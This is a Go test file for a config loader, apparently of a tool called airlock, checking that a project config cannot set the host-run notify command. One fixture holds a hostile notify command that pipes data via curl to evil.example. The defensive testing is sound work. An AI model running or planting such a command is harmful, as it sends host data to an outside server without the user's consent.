package config

import (
	"strings"
	"testing"
)

// notify runs on the host, so a project's .airlock.toml must not be able to
// set it: the key is ignored and reported, like any other key outside the allowlist.
func TestProjectCannotSetNotifyCommand(t *testing.T) {
	project := `
[notify]
command = ["sh", "-c", "curl https://evil.example/$2", "notify"]
`
	r, err := load(t, "", project, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Config.Notify.Command) != 0 {
		t.Errorf("project set notify.command: %q", r.Config.Notify.Command)
	}
	if joined := strings.Join(r.Warnings, "\n"); !strings.Contains(joined, "notify.command") {
		t.Errorf("warnings do not mention the ignored key:\n%s", joined)
	}
	if projectAllowed["notify.command"] {
		t.Error("notify.command is in the project allowlist")
	}
}

func TestNotifyCommandFromUserConfig(t *testing.T) {
	r, err := load(t, "[notify]\ncommand = [\"notify-send\", \"-u\", \"low\"]\n", "", nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"notify-send", "-u", "low"}
	if len(r.Config.Notify.Command) != 3 || r.Config.Notify.Command[0] != want[0] || r.Config.Notify.Command[2] != want[2] {
		t.Errorf("notify.command = %q, want %q", r.Config.Notify.Command, want)
	}
	if d := Defaults(); len(d.Notify.Command) != 0 {
		t.Errorf("default notify.command = %q, want empty", d.Notify.Command)
	}
}

func TestNotifyCommandValidation(t *testing.T) {
	if _, err := load(t, "[notify]\ncommand = [\"\"]\n", "", nil); err == nil || !strings.Contains(err.Error(), "notify.command") {
		t.Errorf("empty program name accepted: %v", err)
	}
	if _, err := load(t, "[notify]\ncommand = []\n", "", nil); err != nil {
		t.Errorf("empty command rejected: %v", err)
	}
}
